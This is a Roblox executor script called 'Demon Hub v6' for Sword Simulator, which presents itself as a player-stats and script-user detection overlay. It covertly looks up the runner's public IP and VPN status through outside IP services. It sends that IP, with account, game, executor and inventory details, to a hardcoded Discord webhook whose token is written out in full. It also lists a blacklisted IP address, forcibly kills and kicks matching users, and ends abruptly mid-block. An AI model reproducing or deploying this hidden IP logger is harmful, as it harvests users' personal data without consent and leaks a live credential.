-- DEMON HUB v6 - Professional Stats & User Detection
-- Build: October 10, 2025
-- Fixed Logging, Improved Detection & Modern Features
-- Patched for safe re-execution with configurable blacklist duration

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")

-- CONFIGURATION
local CONFIG = {
    BLACKLIST_KICK_DURATION = 13, -- Duration (in seconds) before blacklisted user is kicked
    BLACKLISTED_IPS = {"73.180.215.103"},
    OWNER_ID = 1212018424,
    VERSION = "6",
    SCRIPT_NAME = "Demon Hub",
    BUILD_NUMBER = "October 10, 2025",
    SUPPORTED_GAME_ID = 6786702955,
    SUPPORTED_GAME_NAME = "Sword Simulator",
    STATUS_KEY = Enum.KeyCode.Insert,
    HEARTBEAT_INTERVAL = 1,
    DETECTION_TIMEOUT = 10,
    NOTIFICATION_DURATION = 5,
    WEBHOOK_URL = "https://discord.com/api/webhooks/1417206501399072848/ih27l44GewTGIBXHk6A5ulpHd7ija6WYWxsg6RB_DcMnFEUivWgJp4ZDzB06fNoeeXUF",
    MARKER_NAME = "DemonUI_Marker_v6"
}

-- STATE MANAGEMENT
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
local State = {
    connections = {},
    playerLabels = {},
    scriptUsers = {},
    notificationQueue = {},
    webhookCooldowns = {},
    isProcessing = false,
    isInitialized = false,
    startTime = tick(),
    sessionId = HttpService:GenerateGUID(false),
    cachedIP = nil,
    cachedExecutor = nil
}

-- Create ScreenGui with error handling
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DemonUI_v6_" .. State.sessionId:sub(1, 8)
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999
screenGui.Parent = PlayerGui or game:GetService("CoreGui")

-- UTILITY FUNCTIONS
local Utils = {}
function Utils.isIPBlacklisted(ip)
    return ip and table.find(CONFIG.BLACKLISTED_IPS, ip) ~= nil
end

function Utils.isOwner(userId)
    return userId == CONFIG.OWNER_ID
end

function Utils.isScriptUser(userId)
    if not State.scriptUsers then return false end
    local user = State.scriptUsers[userId]
    return user and (tick() - user.lastSeen) < CONFIG.DETECTION_TIMEOUT
end

function Utils.getUserRole(userId)
    if not State.scriptUsers then
        return "PLAYER", Color3.fromRGB(100, 149, 237)
    end
    if Utils.isOwner(userId) then
        return "SCRIPT CREATOR", Color3.fromRGB(138, 43, 226)
    elseif State.scriptUsers[userId] then
        return "SCRIPT USER", Color3.fromRGB(85, 255, 127)
    end
    return "PLAYER", Color3.fromRGB(100, 149, 237)
end

function Utils.canSendWebhook(userId)
    local now = tick()
    if not State.webhookCooldowns[userId] or (now - State.webhookCooldowns[userId]) >= 0.5 then
        State.webhookCooldowns[userId] = now
        return true
    end
    return false
end

function Utils.formatUptime(seconds)
    local d, h, m, s = math.floor(seconds/86400), math.floor(seconds/3600)%24, math.floor(seconds/60)%60, math.floor(seconds%60)
    if d > 0 then return string.format("%dd %dh %dm", d, h, m)
    elseif h > 0 then return string.format("%dh %dm %ds", h, m, s)
    else return string.format("%dm %ds", m, s)
    end
end

function Utils.formatNumber(num)
    if not num then return "N/A" end
    if num >= 1000000000 then return string.format("%.2fB", num / 1000000000)
    elseif num >= 1000000 then return string.format("%.2fM", num / 1000000)
    elseif num >= 1000 then return string.format("%.2fK", num / 1000)
    end
    return tostring(num)
end

function Utils.getExecutorInfo()
    if State.cachedExecutor then return State.cachedExecutor end
    local info = {name = "Unknown", level = "N/A", version = "N/A", features = "Standard"}
    local g = getfenv()
    if g.identifyexecutor then
        local success, name, version = pcall(g.identifyexecutor)
        if success and name then
            info.name = name
            info.version = version or "Latest"
            info.level = "Level 7+"
            info.features = "Full API Support"
        end
    elseif g.getexecutorname then
        local success, name = pcall(g.getexecutorname)
        if success and name then
            info.name = name
            info.level = "Level 7+"
            info.features = "Full API Support"
        end
    elseif g.syn or g.is_syn_loaded or g.secure_load then
        info.name = "Synapse X/Z"
        info.level = "Level 8"
        info.version = g.syn and "Synapse X" or "Synapse Z"
        info.features = "Full Luau VM"
    elseif g.KRNL_LOADED then
        info.name = "KRNL"
        info.level = "Level 7"
        info.features = "Function Hooking"
    elseif g.SW_VERSION or g.IsScriptWare then
        info.name = "Script-Ware"
        level = "Level 7"
        info.version = tostring(g.SW_VERSION or "Latest")
        info.features = "High Compatibility"
    elseif g.fluxus_LOADED or g.fluxus then
        info.name = "Fluxus"
        info.level = "Level 7"
        info.features = "Wide API Support"
    elseif g.OXYGEN_LOADED then
        info.name = "Oxygen U"
        info.level = "Level 7"
        info.features = "Common Functions"
    elseif g.pebc_execute then
        info.name = "ProtoSmasher"
        info.level = "Level 7"
        info.features = "Proto Execution"
    elseif g.SENTINEL_LOADED then
        info.name = "Sentinel"
        info.level = "Level 7"
        info.features = "Script Hub"
    elseif g.is_sirhurt_closure then
        info.name = "SirHurt"
        info.level = "Level 7"
        info.features = "Advanced API"
    end
    State.cachedExecutor = info
    return info
end

function Utils.formatSessionId(sessionId)
    return sessionId:upper():gsub("(.{8})(.{4})(.{4})(.{4})(.{12})", "%1-%2-%3-%4-%5")
end

-- PLAYER STATS DETECTION
local PlayerStats = {}
function PlayerStats.getLeaderstats(player)
    local stats = {power = "N/A", kills = "N/A", coins = "N/A", level = "N/A"}
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local power = leaderstats:FindFirstChild("Power") or leaderstats:FindFirstChild("Strength")
        local kills = leaderstats:FindFirstChild("Kills") or leaderstats:FindFirstChild("KOs")
        local coins = leaderstats:FindFirstChild("Coins") or leaderstats:FindFirstChild("Gold") or leaderstats:FindFirstChild("Cash")
        local level = leaderstats:FindFirstChild("Level") or leaderstats:FindFirstChild("Rank")
        if power then stats.power = Utils.formatNumber(power.Value) end
        if kills then stats.kills = Utils.formatNumber(kills.Value) end
        if coins then stats.coins = Utils.formatNumber(coins.Value) end
        if level then stats.level = Utils.formatNumber(level.Value) end
    end
    return stats
end

function PlayerStats.getInventory(player)
    local inventory = {toolCount = 0, tools = {}}
    local toolCounts = {}
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                toolCounts[tool.Name] = (toolCounts[tool.Name] or 0) + 1
            end
        end
    end
    if player.Character then
        local equippedTool = player.Character:FindFirstChildOfClass("Tool")
        if equippedTool then
            toolCounts[equippedTool.Name] = (toolCounts[equippedTool.Name] or 0) + 1
        end
    end
    for name, count in pairs(toolCounts) do
        inventory.toolCount = inventory.toolCount + count
        table.insert(inventory.tools, count > 1 and string.format("%s x%d", name, count) or name)
    end
    return inventory
end

function PlayerStats.getCharacterInfo(player)
    local info = {health = "N/A", maxHealth = "N/A"}
    if player.Character then
        local humanoid = player.Character:FindFirstChild("Humanoid")
        if humanoid then
            info.health = string.format("%.0f", humanoid.Health)
            info.maxHealth = string.format("%.0f", humanoid.MaxHealth)
        end
    end
    return info
end

-- NETWORK DETECTION
local Network = {}
function Network.getIPAddress()
    if State.cachedIP then return State.cachedIP end
    local ip = "Unavailable"
    local req = request or http_request or (syn and syn.request)
    if req then
        local success, response = pcall(function()
            return req({Url = "https://api.ipify.org", Method = "GET"})
        end)
        if success and response and response.StatusCode == 200 and response.Body then
            ip = response.Body
            State.cachedIP = ip
            return ip
        end
        success, response = pcall(function()
            return req({Url = "https://api.my-ip.io/ip", Method = "GET"})
        end)
        if success and response and response.StatusCode == 200 and response.Body then
            ip = response.Body
            State.cachedIP = ip
            return ip
        end
    end
    State.cachedIP = ip
    return ip
end

function Network.checkVPN()
    local vpnDetected = false
    local req = request or http_request or (syn and syn.request)
    if req then
        local success, response = pcall(function()
            return req({Url = "http://ip-api.com/json/?fields=proxy"})
        end)
        if success and response and response.StatusCode == 200 then
            local decodeSuccess, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
            if decodeSuccess and data then
                vpnDetected = data.proxy or false
            end
        end
    end
    return vpnDetected
end

-- DISCORD LOGGER
local Logger = {}
function Logger.send(player, eventType, ip)
    if CONFIG.WEBHOOK_URL == "" then return end
    if eventType ~= "BLACKLIST_KICK" and not Utils.canSendWebhook(player.UserId) then return end
    task.spawn(function()
        local ipAddress = ip or Network.getIPAddress()
        if eventType == "BLACKLIST_KICK" then
            local embed = {
                title = "Blacklist Enforcement",
                description = string.format("User with blacklisted IP attempted to load %s", CONFIG.SCRIPT_NAME),
                color = 16711680,
                fields = {
                    {name = "Username", value = player.Name, inline = true},
                    {name = "Display Name", value = player.DisplayName, inline = true},
                    {name = "User ID", value = tostring(player.UserId), inline = false},
                    {name = "IP Address", value = ipAddress, inline = false}
                },
                thumbnail = {url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", player.UserId)},
                footer = {text = string.format("%s v%s | Access Denied", CONFIG.SCRIPT_NAME, CONFIG.VERSION)},
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
            local payload = {username = CONFIG.SCRIPT_NAME .. " Security", embeds = {embed}}
            local req = request or http_request or (syn and syn.request)
            if req then
                pcall(function()
                    req({
                        Url = CONFIG.WEBHOOK_URL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(payload)
                    })
                end)
            end
            return
        end

        local isUsingVPN = Network.checkVPN()
        local gameName, gameCreator = "Unknown", "Unknown"
        local success, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
        if success and info then
            gameName = info.Name
            gameCreator = info.Creator.Name
        end

        local membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Standard"
        local stats = PlayerStats.getLeaderstats(player)
        local inventory = PlayerStats.getInventory(player)
        local charInfo = PlayerStats.getCharacterInfo(player)
        local executor = Utils.getExecutorInfo()

        local eventData = {
            ["SCRIPT_LOAD"] = {
                title = "Script Loaded",
                color = 3066993,
                desc = string.format("**%s** (@%s) loaded %s v%s", player.DisplayName, player.Name, CONFIG.SCRIPT_NAME, CONFIG.VERSION)
            },
            ["USER_LEFT"] = {
                title = "User Disconnected",
                color = 15105570,
                desc = string.format("**%s** (@%s) disconnected", player.DisplayName, player.Name)
            }
        }

        local event = eventData[eventType] or eventData["SCRIPT_LOAD"]
        local toolsList = #inventory.tools > 0 and table.concat(inventory.tools, ", ") or "None"
        if #toolsList > 1000 then toolsList = toolsList:sub(1, 997) .. "..." end

        local statsValue = string.format("**Power:** %s\n**Kills:** %s", stats.power, stats.kills)
        if stats.coins ~= "N/A" then
            statsValue = statsValue .. string.format("\n**Coins:** %s", stats.coins)
        end
        if stats.level ~= "N/A" then
            statsValue = statsValue .. string.format("\n**Level:** %s", stats.level)
        end

        local fields = {
            {name = "Player Info", value = string.format("**Username:** %s\n**Display:** %s\n**User ID:** %d\n**Age:** %d days\n**Type:** %s", player.Name, player.DisplayName, player.UserId, player.AccountAge, membership), inline = false},
            {name = "Game Info", value = string.format("**Game:** %s\n**Creator:** %s\n**Place ID:** %d\n**Players:** %d/%d", gameName, gameCreator, game.PlaceId, #Players:GetPlayers(), Players.MaxPlayers), inline = false},
            {name = "Network", value = string.format("**IP:** %s\n**VPN:** %s\n**Ping:** %d ms", ipAddress, isUsingVPN and "Yes" or "No", math.floor(player:GetNetworkPing() * 1000)), inline = true},
            {name = "Stats", value = statsValue, inline = true},
            {name = "Character", value = string.format("**Health:** %s/%s", charInfo.health, charInfo.maxHealth), inline = true},
            {name = "Inventory", value = string.format("**Tools:** %d\n**Items:** %s", inventory.toolCount, toolsList), inline = false},
            {name = "Executor", value = string.format("**Name:** %s\n**Level:** %s\n**Version:** %s\n**Features:** %s", executor.name, executor.level, executor.version, executor.features), inline = false},
            {name = "Session", value = string.format("**ID:** %s\n**Uptime:** %s\n**Version:** v%s", Utils.formatSessionId(State.sessionId):sub(1, 36), Utils.formatUptime(tick() - State.startTime), CONFIG.VERSION), inline = false}
        }

        local embed = {
            title = event.title,
            description = event.desc,
            color = event.color,
            fields = fields,
            thumbnail = {url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", player.UserId)},
            footer = {text = string.format("%s v%s | Demon Development", CONFIG.SCRIPT_NAME, CONFIG.VERSION)},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }

        local req = request or http_request or (syn and syn.request)
        if req then
            pcall(function()
                req({
                    Url = CONFIG.WEBHOOK_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({username = CONFIG.SCRIPT_NAME, embeds = {embed}})
                })
            end)
        end
    end)
end

-- SECURITY MANAGER
local Security = {}
function Security.forceShutdown()
    if State and State.connections then
        for _, conn in pairs(State.connections) do
            pcall(function() conn:Disconnect() end)
        end
    end

    if PlayerGui then
        for _, gui in pairs(PlayerGui:GetChildren()) do
            if gui.Name:match("DemonUI") or gui.Name:match("BLACKLIST_SCREEN") then
                pcall(function() gui:Destroy() end)
            end
        end
    end

    if LocalPlayer.Character then
        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then humanoid.Health = 0 end
    end

    if State then
        State.isInitialized = false
    end
    _G.DemonUICleanup = nil
end

function Security.kickBlacklisted(ip)
    Logger.send(LocalPlayer, "BLACKLIST_KICK", ip)
    State.isInitialized = false
    Security.forceShutdown()

    local kickGui = Instance.new("ScreenGui")
    kickGui.Name = "BLACKLIST_SCREEN_" .. HttpService:GenerateGUID(false)
    kickGui.ResetOnSpawn = false
    kickGui.IgnoreGuiInset = true
    kickGui.DisplayOrder = 2147483647
    kickGui.Enabled = true
    kickGui.Parent = PlayerGui or game:GetService("CoreGui")

    local bg = Instance.new("Frame", kickGui)
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BackgroundTransparency = 0.2
    bg.BorderSizePixel = 0
    bg.ZIndex = 2147483647

    local main = Instance.new("Frame", bg)
    main.Size = UDim2.new(0, 500, 0, 320)
    main.AnchorPoint = Vector2.new(0.5, 0.5)
    main.Position = UDim2.fromScale(0.5, 0.5)
    main.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
    main.BorderSizePixel = 0
    main.ZIndex = 2147483647

    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)

    local stroke = Instance.new("UIStroke", main)
    stroke.Color = Color3.fromRGB(255, 59, 48)
    stroke.Thickness = 2.5
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 40)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 32
    title.TextColor3 = Color3.fromRGB(255, 69, 58)
    title.Text = "ACCESS DENIED"
    title.ZIndex = 2147483647

    local msg = Instance.new("TextLabel", main)
    msg.Size = UDim2.new(1, -40, 0, 120)
    msg.Position = UDim2.new(0, 20, 0, 100)
    msg.BackgroundTransparency = 1
    msg.Font = Enum.Font.Gotham
    msg.TextSize = 15
    msg.TextColor3 = Color3.fromRGB(200, 200, 210)
    msg.TextWrapped = true
    msg.Text = "Your access to Demon Hub has been revoked due to an identified abuse of our security protocols. Your account is permanently banned from this service. If you believe this decision was made in error, please submit a formal appeal, including your User ID, to our support team for review."
    msg.ZIndex = 2147483647

    local countdown = Instance.new("TextLabel", main)
    countdown.Size = UDim2.new(1, 0, 0, 40)
    countdown.Position = UDim2.new(0, 0, 1, -60)
    countdown.BackgroundTransparency = 1
    countdown.Font = Enum.Font.GothamBold
    countdown.TextSize = 18
    countdown.TextColor3 = Color3.fromRGB(255, 255, 255)
    countdown.ZIndex = 2147483647

    task.spawn(function()
        while true do
            task.wait(0.1)
            if not kickGui or not kickGui.Parent then
                LocalPlayer:Kick("Blacklist bypass attempt detected")
                break
            end
            kickGui.Enabled = true
            kickGui.DisplayOrder = 2147483647
        end
    end)

    task.spawn(function()
        for i = CONFIG.BLACKLIST_KICK_DURATION, 1, -1 do
            countdown.Text = string.format("Disconnecting in %d second%s", i, i == 1 and "" or "s")
            task.wait(1)
            if not kickGui or not kickGui.Parent then
                LocalPlayer:Kick("Blacklist bypass detected")
                return
            end
        end
        countdown.Text = "DISCONNECTING..."
        task.wait(0.3)
        LocalPlayer:Kick(string.format([[ACCESS REVOKED: Your account has been blacklisted from %s due to security protocol violation. Status: Permanently Banned. This decision is final.]], CONFIG.SCRIPT_NAME))
    end)
end

-- NOTIFICATION SYSTEM
local Notify = {}
function Notify.create(title, message, color, duration)
    table.insert(State.notificationQueue, {
        title = title,
        message = message,
        color = color or Color3.fromRGB(100, 149, 237),
        duration = duration or CONFIG.NOTIFICATION_DURATION
    })

    if State.isProcessing then return end
    State.isProcessing = true
    task.spawn(function()
        while #State.notificationQueue > 0 do
            if not State.isInitialized then break end
            Notify.display(table.remove(State.notificationQueue, 1))
        end
        State.isProcessing = false
    end)
end

function Notify.display(data)
    local frame = Instance.new("Frame", screenGui)
    frame.Size = UDim2.new(0, 340, 0, 80)
    frame.Position = UDim2.new(1, 10, 0.08, 0)
    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
    frame.BackgroundTransparency = 1
    frame.BorderSizePixel = 0

    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = data.color
    stroke.Thickness = 2
    stroke.Transparency = 0.3
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, -20, 0, 22)
    title.Position = UDim2.new(0, 10, 0, 10)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 15
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Text = data.title
    title.ZIndex = 2

    local msg = Instance.new("TextLabel", frame)
    msg.Size = UDim2.new(1, -20, 0, 38)
    msg.Position = UDim2.new(0, 10, 0, 34)
    msg.BackgroundTransparency = 1
    msg.Font = Enum.Font.Gotham
    msg.TextSize = 13
    msg.TextColor3 = Color3.fromRGB(190, 190, 200)
    msg.TextXAlignment = Enum.TextXAlignment.Left
    msg.TextYAlignment = Enum.TextYAlignment.Top
    msg.TextWrapped = true
    msg.Text = data.message
    msg.ZIndex = 2

    local bar = Instance.new("Frame", frame)
    bar.Size = UDim2.new(1, 0, 0, 2)
    bar.Position = UDim2.new(0, 0, 1, -2)
    bar.BackgroundColor3 = data.color
    bar.BorderSizePixel = 0
    bar.ZIndex = 2

    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 10)

    local slideIn = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(1, -350, 0.08, 0),
        BackgroundTransparency = 0.05
    })
    local progress = TweenService:Create(bar, TweenInfo.new(data.duration, Enum.EasingStyle.Linear), {
        Size = UDim2.new(0, 0, 0, 2)
    })
    local slideOut = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
        Position = UDim2.new(1, 10, 0.08, 0),
        BackgroundTransparency = 1
    })

    slideIn:Play()
    slideIn.Completed:Wait()
    progress:Play()
    task.wait(data.duration)
    slideOut:Play()
    slideOut.Completed:Connect(function() frame:Destroy() end)
end

-- PLAYER LABEL SYSTEM
local Labels = {}
function Labels.remove(userId)
    if not State.playerLabels then return end
    local data = State.playerLabels[userId]
    if data then
        if data.rainbowConnection then pcall(function() data.rainbowConnection:Disconnect() end) end
        if data.pulseConnection then pcall(function() data.pulseConnection:Disconnect() end) end
        if data.animConnection then pcall(function() data.animConnection:Disconnect() end) end
        if data.glowConnection then pcall(function() data.glowConnection:Disconnect() end) end
        if data.billboard then pcall(function() data.billboard:Destroy() end) end
        State.playerLabels[userId] = nil
    end
end

function Labels.create(player, roleText, roleColor)
    Labels.remove(player.UserId)
    local char = player.Character
    local head = char and char:FindFirstChild("Head")
    if not head then return end

    local isOwner = Utils.isOwner(player.UserId)
    local billboard = Instance.new("BillboardGui", head)
    billboard.Name = "DemonTag_v6"
    billboard.StudsOffset = Vector3.new(0, 2.8, 0)
    billboard.AlwaysOnTop = true
    billboard.Size = UDim2.new(0, 180, 0, 40)
    billboard.MaxDistance = 80
    billboard.LightInfluence = 0

    local container = Instance.new("Frame", billboard)
    container.Size = UDim2.fromScale(1, 1)
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.Position = UDim2.fromScale(0.5, 0.5)
    container.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
    container.BackgroundTransparency = 0.08
    container.BorderSizePixel = 0

    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 10)

    local containerStroke = Instance.new("UIStroke", container)
    containerStroke.Color = roleColor
    containerStroke.Thickness = 2
    containerStroke.Transparency = 0.15
    containerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local innerGlow = Instance.new("Frame", container)
    innerGlow.Size = UDim2.fromScale(1, 1)
    innerGlow.BackgroundColor3 = roleColor
    innerGlow.BackgroundTransparency = 0.92
    innerGlow.BorderSizePixel = 0

    Instance.new("UICorner", innerGlow).CornerRadius = UDim.new(0, 10)

    local label = Instance.new("TextLabel", container)
    label.Size = UDim2.fromScale(1, 1)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.GothamBold
    label.TextSize = 15
    label.Text = roleText
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextStrokeTransparency = 0.5
    label.TextStrokeColor3 = Color3.new(0, 0, 0)

    local gradient = Instance.new("UIGradient", label)
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, roleColor:lerp(Color3.fromRGB(255, 255, 255), 0.5))
    }
    gradient.Rotation = 90

    local rainbowConnection, pulseConnection, animConnection, glowConnection
    if isOwner then
        local hue = 0
        rainbowConnection = RunService.Heartbeat:Connect(function(dt)
            if not billboard or not billboard.Parent then
                rainbowConnection:Disconnect()
                return
            end
            hue = (hue + dt * 0.4) % 1
            local rainbowColor = Color3.fromHSV(hue, 0.8, 1)
            containerStroke.Color = rainbowColor
            innerGlow.BackgroundColor3 = rainbowColor
            gradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
                ColorSequenceKeypoint.new(0.5, rainbowColor:lerp(Color3.fromRGB(255, 255, 255), 0.3)),
                ColorSequenceKeypoint.new(1, rainbowColor)
            }
        end)
        animConnection = RunService.Heartbeat:Connect(function()
            if not billboard or not billboard.Parent then
                animConnection:Disconnect()
                return
            end
            local offset = math.sin(tick() * 2.5) * 0.2
            billboard.StudsOffset = Vector3.new(0, 2.8 + offset, 0)
            containerStroke.Thickness = 2 + math.sin(tick() * 3) * 0.5
        end)
        glowConnection = RunService.Heartbeat:Connect(function()
            if not billboard or not billboard.Parent then
                glowConnection:Disconnect()
                return
            end
            innerGlow.BackgroundTransparency = 0.88 + math.sin(tick() * 3) * 0.06
        end)
    else
        pulseConnection = RunService.Heartbeat:Connect(function()
            if not billboard or not billboard.Parent then
                pulseConnection:Disconnect()
                return
            end
            containerStroke.Transparency = 0.15 + math.sin(tick() * 1.8) * 0.08
            innerGlow.BackgroundTransparency = 0.92 + math.sin(tick() * 2) * 0.04
        end)
    end

    State.playerLabels[player.UserId] = {
        billboard = billboard,
        rainbowConnection = rainbowConnection,
        pulseConnection = pulseConnection,
        animConnection = animConnection,
        glowConnection = glowConnection,
        lastUpdate = tick(),
        roleText = roleText -- MODIFIED: Added role tracking
    }
end

function Labels.update(player)
    if not State.isInitialized or not player or not player.Parent then
        Labels.remove(player.UserId)
        return
    end

    local roleText, roleColor = Utils.getUserRole(player.UserId)
    if not roleText then
        Labels.remove(player.UserId)
        return
    end

    local char = player.Character
    local head = char and char:FindFirstChild("Head")
    if not head then
        Labels.remove(player.UserId)
        return
    end

    local data = State.playerLabels[player.UserId]
    -- MODIFIED: Check if role has changed and recreate label if needed
    if not data or not data.billboard or not data.billboard.Parent or data.roleText ~= roleText then
        Labels.create(player, roleText, roleColor)
    else
        if data.billboard.Parent ~= head then
            data.billboard.Parent = head
        end
        data.lastUpdate = tick()
    end
end

-- USER REGISTRY
local Registry = {}
function Registry.addMarker(char)
    if not char then return end
    local hum = char:WaitForChild("Humanoid", 5)
    if hum and not hum:FindFirstChild(CONFIG.MARKER_NAME) then
        Instance.new("BoolValue", hum).Name = CONFIG.MARKER_NAME
    end
end

function Registry.registerLocal()
    local uid = LocalPlayer.UserId
    State.scriptUsers[uid] = {
        username = LocalPlayer.Name,
        userId = uid,
        firstSeen = tick(),
        lastSeen = tick(),
        isLocal = true
    }
    if LocalPlayer.Character then
        Registry.addMarker(LocalPlayer.Character)
    end
    State.connections.charAddedLocal = LocalPlayer.CharacterAdded:Connect(function(c)
        task.wait(0.5)
        Registry.addMarker(c)
        Labels.update(LocalPlayer)
    end)
end

function Registry.detectUsers()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local hum = player.Character:FindFirstChild("Humanoid")
            if hum and hum:FindFirstChild(CONFIG.MARKER_NAME) then
                if not State.scriptUsers[player.UserId] then
                    Notify.create(
                        "Script User Detected",
                        string.format("%s is using the script", player.Name),
                        Color3.fromRGB(85, 255, 127)
                    )
                end
                State.scriptUsers[player.UserId] = {
                    username = player.Name,
                    userId = player.UserId,
                    firstSeen = State.scriptUsers[player.UserId] and State.scriptUsers[player.UserId].firstSeen or tick(),
                    lastSeen = tick(),
                    isLocal = false
                }
            end
        end
    end
end

-- GAME CHECK
local function checkGame()
    if game.PlaceId == CONFIG.SUPPORTED_GAME_ID then
        return true
    end
    local currentGameName = "Unknown"
    local success, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
    if success and info then
        currentGameName = info.Name
    end
    Notify.create(
        "Wrong Game Detected",
        string.format("Teleporting to %s...", CONFIG.SUPPORTED_GAME_NAME),
        Color3.fromRGB(255, 165, 0),
        3
    )
    task.wait(2)
    local failureConnection
    failureConnection = TeleportService.TeleportInitFailed:Connect(function(_, teleportResult)
        if teleportResult ~= Enum.TeleportResult.Success then
            task.wait(1)
            LocalPlayer:Kick(string.format([[WRONG GAME DETECTED %s is designed for %s only. Current Game: %s Place ID: %d Automatic teleport failed. Please join the correct game manually. Supported Game ID: %d]],
                CONFIG.SCRIPT_NAME,
                CONFIG.SUPPORTED_GAME_NAME,
                currentGameName,
                game.PlaceId,
                CONFIG.SUPPORTED_GAME_ID
            ))
            game:Shutdown()
        end
        failureConnection:Disconnect()
    end)
    TeleportService:Teleport(CONFIG.SUPPORTED_GAME_ID, LocalPlayer)
    task.wait(5)
    return false
end

-- CLEANUP
local function cleanup()
    if not State then return end
    State.isInitialized = false
    for _, conn in pairs(State.connections) do
        pcall(function() conn:Disconnect() end)
    end
    for uid in pairs(State.playerLabels) do
        Labels.remove(uid)
    end
    if screenGui and screenGui.Parent then
        pcall(function() screenGui:Destroy() end)
    end
end

-- INITIALIZATION
local function init()
    if State.isInitialized then return end
    local ip = Network.getIPAddress()
    if Utils.isIPBlacklisted(ip) then
        Security.kickBlacklisted(ip)
        return
    end
    if not checkGame() then return end
    State.isInitialized = true
    Registry.registerLocal()
    Logger.send(LocalPlayer, "SCRIPT_LOAD")

    for _, player in pairs(Players:GetPlayers()) do
        Labels.update(player)
        State.connections["char_" .. player.UserId] = player.CharacterAdded:Connect(function()
            task.wait(0.5)
            Labels.update(player)
        end)
    end

    State.connections.playerAdded = Players.PlayerAdded:Connect(function(player)
        task.wait(1)
        Labels.update(player)
        State.connections["char_" .. player.UserId] = player.CharacterAdded:Connect(function()
            task.wait(0.5)
            Labels.update(player)
        end)
    end)

    State.connections.playerRemoving = Players.PlayerRemoving:Connect(function(player)
        Labels.remove(player.UserId)
        if State.scriptUsers[player.UserId] and not State.scriptUsers[player.UserId].isLocal then
            Logger.send(player, "USER_LEFT")
            State.scriptUsers[player.UserId] = nil
        end
        if State.connections["char_" .. player.UserId] then
            pcall(function() State.connections["char_" .. player.UserId]:Disconnect() end)
            State.connections["char_" .. player.UserId] = nil
        end
    end)

    task.spawn(function()
        while State.isInitialized do
            task.wait(CONFIG.HEARTBEAT_INTERVAL)
            Registry.detectUsers()
            for _, player in pairs(Players:GetPlayers()) do
                Labels.update(player)
            end
        end
    end)

    State.connections.input = UserInputService.InputBegan:Connect(function(input, proc)
        if proc then return end
        if input.KeyCode == CONFIG.STATUS_KEY then
            local userCount = 0
            for _ in pairs(State.scriptUsers) do
                userCount = userCount + 1
            end
            local executor = Utils.getExecutorInfo()
            local stats = PlayerStats.getLeaderstats(LocalPlayer)
            Notify.create(
                "System Status",
                string.format("Version: v%s\nScript Users: %d\nUptime: %s\nExecutor: %s %s\nPower: %s | Kills: %s\nSession: %s",
                    CONFIG.VERSION,
                    userCount,
                    Utils.formatUptime(tick() - State.startTime),
                    executor.name,
                    executor.level,
                    stats.power,
                    stats.kills,
                    State.sessionId:sub(1, 8):upper()
                ),
                Color3.fromRGB(100, 149, 237),
                12
            )
        end
    end)

    Notify.create(
        CONFIG.SCRIPT_NAME .. " Loaded",
        string.format("Welcome %s!\nVersion %s initialized\nPress [%s] for status",
            LocalPlayer.DisplayName,
            CONFIG.VERSION,
            CONFIG.STATUS_KEY.Name
        ),
        Color3.fromRGB(147, 112, 219),
        6
    )
end

-- EXECUTE
if _G.DemonUICleanup then
    pcall(_G.DemonUICleanup)
